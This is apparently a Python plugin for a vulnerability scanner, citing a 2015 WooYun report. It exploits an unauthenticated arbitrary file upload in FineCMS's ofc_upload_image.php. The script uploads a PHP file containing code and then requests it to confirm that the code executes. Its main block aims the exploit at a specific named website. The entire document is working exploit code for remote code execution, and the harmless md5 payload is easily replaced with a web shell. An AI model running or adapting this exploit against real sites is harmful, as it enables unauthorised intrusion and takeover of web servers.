#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2015-0105251

import random
def assign(service, arg):
    if service == "finecms":
        return True, arg


def audit(arg):
    raw = '''POST xxx HTTP/1.1
Content-Length: 20
Connection: Close
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Host: www.baidu.com
Content-Type: application/oct

<?print(md5(0x22))?>'''
    fileName = "test" + str(random.randrange(1000,9999)) + ".php"
    target = arg + 'dayrui/libraries/Chart/ofc_upload_image.php'
    url = target + "?name=" + fileName

    code, head,res, errcode, _ = curl.curl2(url, raw=raw)
    if 'tmp-upload-images' not in res:
        return
    
    shell = arg + 'dayrui/libraries/tmp-upload-images/' + fileName
    _,_,res1,_,_ = curl.curl2(shell)
    if 'e369853df766fa44e1ed0ff613f563bd' in res1:
        security_hole(shell)

                        

if __name__ == '__main__':
    from dummy import *
    audit(assign('finecms', 'http://www.wfeng.net/')[1]) 
